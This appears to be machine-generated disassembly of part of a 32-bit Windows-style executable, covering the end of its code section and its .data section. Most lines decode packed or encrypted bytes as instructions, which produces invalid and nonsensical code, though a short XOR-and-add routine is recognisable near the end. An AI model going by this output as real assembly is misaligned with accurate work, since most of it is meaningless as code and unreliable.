  411b09:	imul   ecx,DWORD PTR [eax],0xb6e3a8c6
  411b0f:	(bad)  
  411b10:	jg     0x411b87
  411b12:	mov    dl,0xc6
  411b14:	jp     0x411aa6
  411b16:	loopne 0x411aea
  411b18:	(bad)  
  411b19:	cmc    
  411b1a:	inc    esp
  411b1b:	das    
  411b1c:	pop    es
  411b1d:	and    BYTE PTR [eax+0x7b30e7b3],0xfc
  411b24:	fldcw  WORD PTR [ebp+0x41b0be56]
  411b2a:	jl     0x411b2d
  411b2c:	enter  0xc678,0x5c
  411b30:	jmp    FWORD PTR [eax]
  411b32:	mov    eax,0x23d1d981
  411b37:	fcmovu st,st(0)
  411b39:	add    DWORD PTR [ecx-0x383a70b3],0x6ee42476
  411b43:	cdq    
  411b44:	jle    0x411af3
  411b46:	imul   esi,DWORD PTR [edx+0x6b89ef2d],0xffffff99
  411b4d:	pop    edx
  411b4e:	mov    cl,0xec
  411b50:	add    ah,BYTE PTR [edx+ebp*4+0x78298ecc]
  411b57:	fsubr  DWORD PTR [edx-0x22972fb3]
  411b5d:	iret   
  411b5e:	and    ch,BYTE PTR [ecx+0x4e]
  411b61:	sub    BYTE PTR [edi],bh
  411b63:	or     DWORD PTR [eax-0x7e],esp
  411b66:	rol    DWORD PTR [ebx-0x50],cl
  411b69:	gs xchg esi,eax
  411b6b:	ins    BYTE PTR es:[edi],dx
  411b6c:	push   ebp
  411b6d:	mov    ch,0xf4
  411b6f:	sbb    BYTE PTR [esi+ecx*4],al
  411b72:	mov    eax,0x91993cd1
  411b77:	inc    esi
  411b78:	push   esi
  411b79:	lea    edx,[ebx]
  411b7b:	dec    edx
  411b7c:	nop
  411b7d:	cli    
  411b7e:	or     al,0xe9
  411b80:	faddp  st(4),st
  411b82:	ds loope 0x411b3d
  411b85:	dec    eax
  411b86:	sbb    dh,dh
  411b88:	les    ebx,FWORD PTR [ebx+0x18]
  411b8b:	cmp    DWORD PTR [ebx-0x3aa8ee22],edx
  411b91:	ss lahf 
  411b93:	sbb    DWORD PTR [eax],ebp
  411b95:	pop    ds
  411b96:	pop    ebp
  411b97:	lock mov esp,0x6047f987
  411b9d:	sbb    eax,0x72c2de3
  411ba2:	mov    ds:0xe78227ea,al
  411ba7:	lea    ebx,[eax]
  411ba9:	shr    DWORD PTR [ebx+eax*1+0x671590d0],0x3f
  411bb1:	push   esp
  411bb2:	(bad)  
  411bb3:	iret   
  411bb4:	icebp  
  411bb5:	ror    ch,0x99
  411bb8:	out    0xe5,al
  411bba:	add    DWORD PTR [ebp+0x43],edx
  411bbd:	inc    eax
  411bbe:	and    eax,0xfadd3598
  411bc3:	mov    bh,0xc0
  411bc5:	xchg   ebx,eax
  411bc6:	inc    ebp
  411bc7:	and    ebp,ecx
  411bc9:	push   ecx
  411bca:	loope  0x411c0b
  411bcc:	fld    TBYTE PTR [ebp+0x2dae790a]
  411bd2:	dec    ebx
  411bd3:	add    eax,0xd76460ab
  411bd8:	mov    cr5,ebp
  411bdb:	mov    edi,0x80fa911b
  411be0:	imul   ecx,esp,0x5790d106
  411be6:	jb     0x411b74
  411be8:	aas    
  411be9:	dec    ebx
  411bea:	retf   
  411beb:	dec    edx
  411bec:	data16 cld 
  411bee:	cmp    al,0xf4
  411bf0:	jbe    0x411b8c
  411bf2:	add    DWORD PTR [edx+0x724fd031],ebp
  411bf8:	leave  
  411bf9:	xchg   esi,eax
  411bfa:	je     0x411c01
  411bfc:	inc    edx
  411bfd:	dec    eax
  411bfe:	jecxz  0x411c28
  411c00:	mov    ah,0x25
  411c02:	fidivr WORD PTR [edi+0x7e756db2]
  411c08:	outs   dx,BYTE PTR ds:[esi]
  411c09:	enter  0xf92f,0xfb
  411c0d:	jbe    0x411c1f
  411c0f:	cmp    BYTE PTR [edx-0x3f13c596],bh
  411c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c16:	or     BYTE PTR ds:0x5fed473f,cl
  411c1c:	call   DWORD PTR [edx-0x21b88e06]
  411c22:	adc    DWORD PTR [ecx+0x779c390],ecx
  411c28:	and    al,0xad
  411c2a:	lds    esp,FWORD PTR [ebp-0x6d]
  411c2d:	fcom   QWORD PTR [ecx]
  411c2f:	xchg   edi,eax
  411c30:	pushf  
  411c31:	add    al,0xa5
  411c33:	popf   
  411c34:	test   DWORD PTR [ecx+edx*4+0x683bdc0e],edi
  411c3b:	push   ebx
  411c3c:	xor    eax,edx
  411c3e:	push   esi
  411c3f:	mov    esi,DWORD PTR [ebp+0x8]
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0xb8dad6c4
  411c5b:	adc    ch,BYTE PTR [ebx]
  411c5d:	ja     0x411c26
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	dec    edx
  411c67:	int    0xe5
  411c69:	in     al,dx
  411c6a:	and    BYTE PTR [ebp-0x69],0xa2
  411c6e:	pop    ds
  411c6f:	mov    eax,ds:0xa4d0394a
  411c74:	ins    BYTE PTR es:[edi],dx
  411c75:	mov    ds:0xf644888b,al
  411c7a:	pop    esi
  411c7b:	mov    eax,0x6197a78
  411c80:	cmp    ebp,DWORD PTR [ecx+0x1c0d2088]
  411c86:	inc    ebp
  411c87:	iret   
  411c88:	sbb    bl,BYTE PTR [edi]
  411c8a:	pop    es
  411c8b:	out    0x86,al
  411c8d:	push   ds
  411c8e:	dec    edx
  411c8f:	push   ebp
  411c90:	mov    ebp,0xce86013c
  411c95:	mov    al,BYTE PTR ds:0xa207a978
  411c9b:	sbb    DWORD PTR [ebp+0x267a9eed],ebp
  411ca1:	pop    ebp
  411ca2:	test   DWORD PTR [ecx+ebx*2],esi
  411ca5:	mov    esp,ds
  411ca7:	outs   dx,BYTE PTR ds:[esi]
  411ca8:	mov    cs,eax
  411caa:	and    cl,BYTE PTR [esp+esi*4-0x58]
  411cae:	fistp  WORD PTR [esi+0x4e935295]
  411cb4:	and    DWORD PTR [eax],0x8bc4c152
  411cba:	add    ecx,DWORD PTR [edx]
  411cbc:	xchg   esi,eax
  411cbd:	(bad)  
  411cbe:	and    DWORD PTR [ebp+0x61],ebp
  411cc1:	div    DWORD PTR cs:[edx-0x250615c6]
  411cc8:	pusha  
  411cc9:	test   al,0x17
  411ccb:	mov    eax,0x3e2a3a49
  411cd0:	and    BYTE PTR gs:[ebx],dl
  411cd3:	dec    di
  411cd5:	dec    edi
  411cd6:	adc    ecx,ebx
  411cd8:	aad    0xd4
  411cda:	mov    ah,0x49
  411cdc:	ds push cs
  411cde:	outs   dx,DWORD PTR ds:[esi]
  411cdf:	pop    ebp
  411ce0:	xchg   edi,eax
  411ce1:	inc    ecx
  411ce2:	mov    edx,0x9b931f8f
  411ce7:	cmp    edx,DWORD PTR [ebx-0x34]
  411cea:	xor    cl,bh
  411cec:	xor    ah,BYTE PTR [edi+0x32]
  411cef:	adc    DWORD PTR [edx-0x1a708fb7],esi
  411cf5:	shl    BYTE PTR [ebx],cl
  411cf7:	popf   
  411cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cf9:	fdivr  QWORD PTR [ecx-0x3]
  411cfc:	mov    ecx,0x13d5caa9
  411d01:	mov    eax,0x23119f7a
  411d06:	stos   BYTE PTR es:[edi],al
  411d07:	pop    eax
  411d08:	leave  
  411d09:	hlt    
  411d0a:	jp     0x411c92
  411d0c:	mov    edx,0x75920cce
  411d11:	adc    ch,dh
  411d13:	cmp    ebx,DWORD PTR [ebx+0x40]
  411d16:	jb     0x411ca7
  411d18:	sub    eax,0x28d22459
  411d1d:	outs   dx,DWORD PTR ds:[esi]
  411d1e:	bound  ebp,QWORD PTR [ebx]
  411d20:	bound  edx,QWORD PTR [esp+eiz*4]
  411d23:	scas   al,BYTE PTR es:[edi]
  411d24:	rcr    DWORD PTR [bp+di-0x3c],0xd9
  411d29:	mov    edx,DWORD PTR [edx+0x1f]
  411d2c:	ss gs popf 
  411d2f:	add    eax,0x155054ba
  411d34:	inc    eax
  411d35:	sbb    edx,DWORD PTR [edi+esi*2+0x79e72356]
  411d3c:	jns    0x411d66
  411d3e:	je     0x411cdc
  411d40:	test   al,0xf4
  411d42:	fidivr WORD PTR [esp+edi*8-0x65]
  411d46:	retf   0x5224
  411d49:	lds    edi,FWORD PTR [esi-0x6d8fdd38]
  411d4f:	shr    BYTE PTR [eax+edi*1+0x59],1
  411d53:	fist   WORD PTR [ebp+0x75b507d5]
  411d59:	push   edx
  411d5a:	rcr    DWORD PTR [esi+0xf8d4339],1
  411d60:	scas   al,BYTE PTR es:[edi]
  411d61:	jecxz  0x411db5
  411d63:	add    BYTE PTR [edi],dl
  411d65:	jnp    0x411db6
  411d67:	sub    DWORD PTR [ebp+0x2a],ecx
  411d6a:	adc    edx,edx
  411d6c:	int3   
  411d6d:	mov    BYTE PTR [edx+0x7a80de66],ch
  411d73:	jp     0x411db9
  411d75:	ja     0x411d77
  411d77:	and    DWORD PTR [esi-0x1e1d7ff2],0xffffff87
  411d7e:	xchg   edx,eax
  411d7f:	lods   eax,DWORD PTR ds:[esi]
  411d80:	cwde   
  411d81:	icebp  
  411d82:	rcr    DWORD PTR [eax+edi*8],cl
  411d85:	fcomip st,st(7)
  411d87:	bound  edi,QWORD PTR [edx]
  411d89:	xor    esi,DWORD PTR ds:0xc93ac05a
  411d8f:	inc    ecx
  411d90:	jl     0x411d35
  411d92:	pop    ds
  411d93:	mov    al,ds:0xf7414ecf
  411d98:	cli    
  411d99:	add    ah,bh
  411d9b:	cld    
  411d9c:	(bad)  
  411d9e:	mov    ecx,0xfe9b1f0e
  411da3:	pop    eax
  411da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411da5:	pop    ebx
  411da6:	cli    
  411da7:	out    0xc4,al
  411da9:	push   ebp
  411daa:	adc    DWORD PTR [ecx-0x7fd682aa],ebp
  411db0:	sbb    ecx,DWORD PTR [eax-0x323c7477]
  411db6:	fcomip st,st(3)
  411db8:	mov    ds:0x9f55ffa8,eax
  411dbd:	fisub  WORD PTR [edi]
  411dbf:	jl     0x411dcc
  411dc1:	mov    ch,0x7e
  411dc3:	sub    al,0x55
  411dc5:	mov    cl,0xdc
  411dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dc8:	loope  0x411d5d
  411dca:	int3   
  411dcb:	xor    BYTE PTR [ebx],ah
  411dcd:	stos   BYTE PTR es:[edi],al
  411dce:	loop   0x411e2c
  411dd0:	fldenv [ebp-0x425c607a]
  411dd6:	ds pop ebx
  411dd8:	mov    ecx,0xc8dac1ce
  411ddd:	mov    al,BYTE PTR [edi]
  411ddf:	inc    esp
  411de0:	repz aad 0x3a
  411de3:	jmp    0x14514219
  411de8:	mov    dh,BYTE PTR [di]
  411deb:	scas   eax,DWORD PTR es:[edi]
  411dec:	rdpmc  
  411dee:	sti    
  411def:	xchg   edx,eax
  411df0:	and    edi,DWORD PTR [edi-0x30]
  411df3:	jmp    0xe26ebbc5
  411df8:	sbb    cl,BYTE PTR [edx]
  411dfa:	jns    0x411da2
  411dfc:	aam    0x9f
  411dfe:	mov    esp,ebp
  411e00:	lods   al,BYTE PTR ds:[esi]
  411e01:	add    ebx,ecx
  411e03:	pop    ds
  411e04:	mov    dh,ah
  411e06:	jno    0x411d9a
  411e08:	sbb    ecx,DWORD PTR [ebx+0x45bd1de5]
  411e0e:	adc    eax,0x417565d9
  411e13:	mov    ebp,edx
  411e15:	mov    ebx,0x2c602693
  411e1a:	loope  0x411da3
  411e1c:	push   edx
  411e1d:	sbb    bl,dh
  411e1f:	mov    ebp,0x32ab7a47
  411e24:	bound  edi,QWORD PTR [edi]
  411e26:	lea    ebp,[ecx+ebx*1-0x7d372364]
  411e2d:	mov    bl,cl
  411e2f:	inc    esp
  411e30:	aas    
  411e31:	xor    eax,0xf5daa288
  411e36:	sbb    BYTE PTR [esi+0x47],dl
  411e39:	ror    bl,1
  411e3b:	and    eax,0xc94d7850
  411e40:	and    DWORD PTR [esi-0x342d00d0],esp
  411e46:	in     al,dx
  411e47:	mov    bh,0xaa
  411e49:	jae    0x411e40
  411e4b:	push   edx
  411e4c:	fwait
  411e4d:	push   ebp
  411e4e:	jg     0x411e11
  411e50:	xchg   BYTE PTR [esi+0x1f],bh
  411e53:	std    
  411e54:	and    dl,BYTE PTR [ebx-0x40868f4e]
  411e5a:	loop   0x411ed4
  411e5c:	pop    ds
  411e5d:	das    
  411e5e:	sub    DWORD PTR ds:0x6db6cce,edi
  411e64:	retf   0xcf3c
  411e67:	dec    esi
  411e68:	mov    al,ds:0xde43913a
  411e6e:	mov    BYTE PTR [edi-0x3d059e5a],bl
  411e74:	and    eax,0x894d696f
  411e79:	stos   BYTE PTR es:[edi],al
  411e7a:	cmp    al,0xde
  411e7c:	jp     0x411e61
  411e7e:	push   edi
  411e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e80:	and    bh,BYTE PTR [edx+0x46399212]
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
